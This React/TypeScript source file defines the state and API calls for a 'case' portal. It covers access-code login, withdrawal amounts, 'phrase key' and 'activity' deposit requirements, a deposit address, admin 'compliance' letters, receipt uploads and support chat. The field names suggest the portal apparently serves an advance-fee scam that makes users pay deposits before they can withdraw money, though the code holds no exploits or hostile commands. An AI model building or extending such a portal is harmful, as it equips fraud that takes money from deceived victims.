import React, { createContext, useContext, useState, useEffect, useRef, useCallback } from "react";
import { useToast } from "@/hooks/use-toast";

export type ViewState = 'login' | 'register' | 'sync' | 'dashboard' | 'letter' | 'messages' | 'submissions' | 'success' | 'deposit' | 'timeline';

export interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  depositAddress?: string;
  profileRedirectUrl?: string;
  hasRequirements?: boolean;
  letterSent?: boolean;
  landingPage?: string;
  showWithdrawalProgress?: boolean;
  withdrawalStage?: string;
  activityDepositAmount?: string;
  phraseKeyDepositAmount?: string;
  phraseKeyMergeDeposit?: string;
  activityWalletRequirement?: string;
  phraseKeyCertificateSent?: boolean;
  submissionUrl?: string;
}

export interface CaseLetter {
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  complianceReference?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionAAmount?: string;
  optionAFrequency?: string;
  optionABatches?: string;
  optionAKeyCost?: string;
  optionATotalRequirement?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionBAmount?: string;
  optionBFrequency?: string;
  optionBBatches?: string;
  optionBKeyCost?: string;
  optionBTotalRequirement?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
  phraseKeyRequirements?: string;
  complianceNotice?: string;
  scheduledFor?: string;
  expiresAt?: string;
}

export interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

export interface ChatMessage {
  id: number;
  caseId: string;
  sender: 'admin' | 'user';
  message: string;
  isRead: string;
  createdAt: string;
}

export interface AdminMessage {
  id: number;
  caseId: string;
  category: 'urgent' | 'processing' | 'resolved';
  title: string;
  body: string;
  isRead: boolean;
  createdAt: string;
}

export interface DepositReceipt {
  id: number;
  caseId: string;
  imageData?: string;
  fileName?: string;
  notes?: string;
  status: string;
  uploadedAt: string;
}

interface PortalContextValue {
  viewState: ViewState;
  setViewState: (state: ViewState) => void;
  currentCase: Case | null;
  setCurrentCase: (c: Case | null) => void;
  accessCode: string;
  setAccessCode: (code: string) => void;
  letterContent: CaseLetter | null;
  setLetterContent: (letter: CaseLetter | null) => void;
  submissions: Submission[];
  setSubmissions: (subs: Submission[]) => void;
  chatMessages: ChatMessage[];
  setChatMessages: (msgs: ChatMessage[]) => void;
  adminMessages: AdminMessage[];
  setAdminMessages: (msgs: AdminMessage[]) => void;
  depositReceipts: DepositReceipt[];
  setDepositReceipts: (receipts: DepositReceipt[]) => void;
  unreadCount: number;
  setUnreadCount: (count: number) => void;
  unreadAdminMessages: number;
  setUnreadAdminMessages: (count: number) => void;
  isChatOpen: boolean;
  setIsChatOpen: (open: boolean) => void;
  loadAllData: () => Promise<void>;
  logout: () => void;
  sendMessage: (message: string) => Promise<void>;
  uploadReceipt: (file: File, notes: string) => Promise<void>;
  markAdminMessageRead: (messageId: number) => Promise<void>;
  hasUrgentMessages: boolean;
}

const PortalContext = createContext<PortalContextValue | null>(null);

export function usePortal() {
  const context = useContext(PortalContext);
  if (!context) {
    throw new Error('usePortal must be used within PortalProvider');
  }
  return context;
}

export function PortalProvider({ children }: { children: React.ReactNode }) {
  const [viewState, setViewState] = useState<ViewState>('login');
  const [currentCase, setCurrentCase] = useState<Case | null>(null);
  const [accessCode, setAccessCode] = useState("");
  const [letterContent, setLetterContent] = useState<CaseLetter | null>(null);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
  const [unreadCount, setUnreadCount] = useState(0);
  const [unreadAdminMessages, setUnreadAdminMessages] = useState(0);
  const [isChatOpen, setIsChatOpen] = useState(false);
  
  const lastMessageCountRef = useRef(0);
  const isInitialLoadRef = useRef(true);
  
  const { toast } = useToast();

  const logout = useCallback(() => {
    setViewState('login');
    setCurrentCase(null);
    setAccessCode("");
    setLetterContent(null);
    setSubmissions([]);
    setChatMessages([]);
    setAdminMessages([]);
    setDepositReceipts([]);
    setUnreadCount(0);
    setUnreadAdminMessages(0);
    setIsChatOpen(false);
    // Clear all session data for security
    sessionStorage.removeItem("caseAccessCode");
    sessionStorage.removeItem("caseId");
    sessionStorage.removeItem("pinVerified");
    sessionStorage.removeItem("requiresPinSetup");
  }, []);

  const loadAllData = useCallback(async () => {
    if (!currentCase) return;
    
    try {
      const [letterRes, submissionsRes, adminMsgRes, receiptsRes] = await Promise.all([
        fetch(`/api/cases/${currentCase.id}/letter`),
        fetch(`/api/cases/${currentCase.id}/submissions`),
        fetch(`/api/cases/${currentCase.id}/admin-messages`),
        fetch(`/api/cases/${currentCase.id}/deposit-receipts`)
      ]);
      
      if (letterRes.ok) {
        const data = await letterRes.json();
        setLetterContent(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        setSubmissions(data);
      }
      
      if (adminMsgRes.ok) {
        const data = await adminMsgRes.json();
        setAdminMessages(data);
        const unread = data.filter((m: AdminMessage) => !m.isRead).length;
        setUnreadAdminMessages(unread);
      }
      
      if (receiptsRes.ok) {
        const data = await receiptsRes.json();
        setDepositReceipts(data);
      }
    } catch (error) {
      console.error('Failed to load data:', error);
    }
  }, [currentCase]);

  useEffect(() => {
    const storedAccessCode = sessionStorage.getItem("caseAccessCode");
    const pinVerified = sessionStorage.getItem("pinVerified");
    const requiresPinSetup = sessionStorage.getItem("requiresPinSetup");
    
    // Only auto-login if PIN was verified OR if this is a new account requiring PIN setup
    if (storedAccessCode && viewState === 'login' && (pinVerified === 'true' || requiresPinSetup === 'true')) {
      (async () => {
        try {
          const response = await fetch(`/api/cases/access/${storedAccessCode}`);
          if (response.ok) {
            const foundCase = await response.json();
            setCurrentCase(foundCase);
            setAccessCode(storedAccessCode);
            
            // If requires PIN setup, go to register view
            if (requiresPinSetup === 'true') {
              setViewState('register');
              return;
            }
            
            const landingPage = foundCase.landingPage || 'dashboard';
            if (foundCase.status === 'active') setViewState(landingPage as ViewState);
            else if (foundCase.status === 'syncing') setViewState('sync');
            else if (foundCase.status === 'completed') setViewState(landingPage as ViewState);
            else setViewState('register');
          } else {
            // Invalid session - clear storage
            sessionStorage.removeItem("caseAccessCode");
            sessionStorage.removeItem("pinVerified");
            sessionStorage.removeItem("requiresPinSetup");
          }
        } catch (error) {
          console.error('Failed to auto-login:', error);
        }
      })();
    } else if (storedAccessCode && !pinVerified && !requiresPinSetup) {
      // Has access code but no PIN verification - clear it for security
      sessionStorage.removeItem("caseAccessCode");
      sessionStorage.removeItem("caseId");
    }
  }, []);

  useEffect(() => {
    if (viewState === 'login' || viewState === 'register') return;

    let timeoutId: NodeJS.Timeout;

    const resetTimeout = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        logout();
        toast({ title: "Session Expired", description: "You have been logged out due to inactivity." });
      }, 3 * 60 * 1000);
    };

    const handleActivity = () => resetTimeout();

    window.addEventListener('mousemove', handleActivity);
    window.addEventListener('keypress', handleActivity);
    window.addEventListener('click', handleActivity);

    resetTimeout();

    return () => {
      window.removeEventListener('mousemove', handleActivity);
      window.removeEventListener('keypress', handleActivity);
      window.removeEventListener('click', handleActivity);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [viewState, toast, logout]);

  useEffect(() => {
    if (currentCase && viewState !== 'login' && viewState !== 'register' && viewState !== 'sync') {
      loadAllData();
    }
  }, [currentCase, viewState, loadAllData]);

  useEffect(() => {
    if (!currentCase || viewState === 'login' || viewState === 'register') return;

    const pollMessages = async () => {
      try {
        const res = await fetch(`/api/cases/${currentCase.id}/messages`);
        if (res.ok) {
          const messages = await res.json();
          setChatMessages(messages);
          
          const adminMsgs = messages.filter((m: ChatMessage) => m.sender === 'admin' && m.isRead === 'false');
          setUnreadCount(adminMsgs.length);
          
          if (!isInitialLoadRef.current && messages.length > lastMessageCountRef.current) {
            const latestMessage = messages[messages.length - 1];
            if (latestMessage.sender === 'admin' && !isChatOpen) {
              playNotificationSound();
              toast({
                title: "New Message",
                description: "You have a new message from support."
              });
            }
          }
          
          lastMessageCountRef.current = messages.length;
          isInitialLoadRef.current = false;
        }
      } catch (error) {
        console.error('Failed to poll messages:', error);
      }
    };

    pollMessages();
    const interval = setInterval(pollMessages, 5000);
    return () => clearInterval(interval);
  }, [currentCase, viewState, isChatOpen, toast]);

  const sendMessage = useCallback(async (message: string) => {
    if (!message.trim() || !currentCase) return;
    
    try {
      const res = await fetch(`/api/cases/${currentCase.id}/messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'user', message: message.trim() })
      });
      
      if (res.ok) {
        const msg = await res.json();
        setChatMessages(prev => [...prev, msg]);
      }
    } catch {
      toast({ variant: "destructive", title: "Error", description: "Failed to send message." });
    }
  }, [currentCase, toast]);

  const uploadReceipt = useCallback(async (file: File, notes: string) => {
    if (!currentCase) return;
    
    return new Promise<void>((resolve, reject) => {
      const reader = new FileReader();
      reader.onerror = () => reject(new Error('Failed to read file'));
      reader.onload = async () => {
        try {
          const response = await fetch(`/api/cases/${currentCase.id}/deposit-receipts`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              imageData: reader.result as string,
              fileName: file.name,
              notes: notes
            })
          });

          if (response.ok) {
            const receipt = await response.json();
            setDepositReceipts(prev => [receipt, ...prev]);
            toast({ title: "Receipt Uploaded", description: "Your deposit receipt has been submitted for review." });
            resolve();
          } else {
            toast({ variant: "destructive", title: "Upload Failed", description: "Unable to upload receipt." });
            reject(new Error('Upload failed'));
          }
        } catch {
          toast({ variant: "destructive", title: "Upload Error", description: "Failed to process file." });
          reject(new Error('Upload error'));
        }
      };
      reader.readAsDataURL(file);
    });
  }, [currentCase, toast]);

  const markAdminMessageRead = useCallback(async (messageId: number) => {
    if (!currentCase) return;
    
    try {
      const res = await fetch(`/api/admin-messages/${messageId}/read`, {
        method: 'POST'
      });
      
      if (res.ok) {
        setAdminMessages(prev => prev.map(m => 
          m.id === messageId ? { ...m, isRead: true } : m
        ));
        setUnreadAdminMessages(prev => Math.max(0, prev - 1));
      }
    } catch {
      console.error('Failed to mark message as read');
    }
  }, [currentCase]);

  const hasUrgentMessages = adminMessages.some(m => m.category === 'urgent' && !m.isRead);

  const value: PortalContextValue = {
    viewState,
    setViewState,
    currentCase,
    setCurrentCase,
    accessCode,
    setAccessCode,
    letterContent,
    setLetterContent,
    submissions,
    setSubmissions,
    chatMessages,
    setChatMessages,
    adminMessages,
    setAdminMessages,
    depositReceipts,
    setDepositReceipts,
    unreadCount,
    setUnreadCount,
    unreadAdminMessages,
    setUnreadAdminMessages,
    isChatOpen,
    setIsChatOpen,
    loadAllData,
    logout,
    sendMessage,
    uploadReceipt,
    markAdminMessageRead,
    hasUrgentMessages,
  };

  return (
    <PortalContext.Provider value={value}>
      {children}
    </PortalContext.Provider>
  );
}

function playNotificationSound() {
  try {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
    oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
    oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.3);
  } catch {
    // Audio not available
  }
}
